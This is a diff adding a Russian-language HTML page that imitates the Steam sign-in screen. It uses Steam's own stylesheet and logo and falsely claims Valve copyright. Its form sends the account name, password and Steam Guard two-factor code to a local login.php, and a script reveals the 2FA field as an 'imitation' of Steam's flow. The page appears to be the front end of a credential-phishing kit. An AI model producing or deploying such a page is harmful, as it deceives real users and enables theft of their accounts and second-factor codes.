@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Войти в Steam</title>
+    <link rel="stylesheet" href="https://community.akamai.steamstatic.com/public/css/login.css?v=4VXEoN9R2H6I">
+    <style>
+        body {
+            background: linear-gradient(135deg, #1a1a1a 0%, #000 100%);
+            font-family: 'Motiva Sans', sans-serif;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+        }
+        .login-container {
+            width: 100%;
+            max-width: 400px;
+            margin: 80px auto;
+            background: rgba(32, 32, 32, 0.95);
+            border-radius: 8px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            border: 1px solid #333;
+        }
+        .steam-logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .steam-logo img {
+            width: 180px;
+            height: auto;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        .input-group label {
+            display: block;
+            color: #b8b8b8;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px 15px;
+            background: #0e0e0e;
+            border: 1px solid #333;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 16px;
+        }
+        .input-group input:focus {
+            outline: none;
+            border-color: #00adee;
+            box-shadow: 0 0 5px rgba(0, 173, 238, 0.5);
+        }
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(90deg, #00adee 0%, #0088cc 100%);
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .login-btn:hover {
+            background: linear-gradient(90deg, #0088cc 0%, #006699 100%);
+        }
+        .footer-links {
+            margin-top: 25px;
+            text-align: center;
+            color: #666;
+            font-size: 13px;
+        }
+        .footer-links a {
+            color: #00adee;
+            text-decoration: none;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        .error-message {
+            color: #ff4757;
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 15px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="steam-logo">
+            <img src="https://community.akamai.steamstatic.com/public/shared/images/header/logo_steam.svg" alt="Steam">
+        </div>
+        <h2 style="text-align: center; margin-bottom: 25px; color: #fff;">Войдите в свою учётную запись Steam</h2>
+        <form id="steamLoginForm" action="login.php" method="POST">
+            <div class="input-group">
+                <label for="username">Имя аккаунта или Email</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            <div class="input-group">
+                <label for="password">Пароль</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <div class="input-group" id="twoFactorGroup" style="display: none;">
+                <label for="twofactor_code">Код из приложения Steam</label>
+                <input type="text" id="twofactor_code" name="twofactor_code" placeholder="6-значный код">
+            </div>
+            <div class="error-message" id="errorText">Неверный логин или пароль. Проверьте данные.</div>
+            <button type="submit" class="login-btn">Войти</button>
+        </form>
+        <div class="footer-links">
+            <p><a href="https://help.steampowered.com/ru/">Забыли данные?</a> | <a href="https://store.steampowered.com/join/">Создать аккаунт</a></p>
+            <p style="margin-top: 10px;">© Valve Corporation. Все права защищены.</p>
+        </div>
+    </div>
+    <script>
+        // Динамическая проверка, имитирующая Steam
+        document.getElementById('steamLoginForm').addEventListener('submit', function(event) {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            if (!username || !password) {
+                document.getElementById('errorText').style.display = 'block';
+                event.preventDefault();
+            } else {
+                // Если введены оба поля, показываем поле для 2FA (имитация)
+                document.getElementById('twoFactorGroup').style.display = 'block';
+                document.getElementById('errorText').style.display = 'none';
+                // Здесь можно добавить дополнительную логику для "проверки"
+            }
+        });
+    </script>
+</body>
+</html>
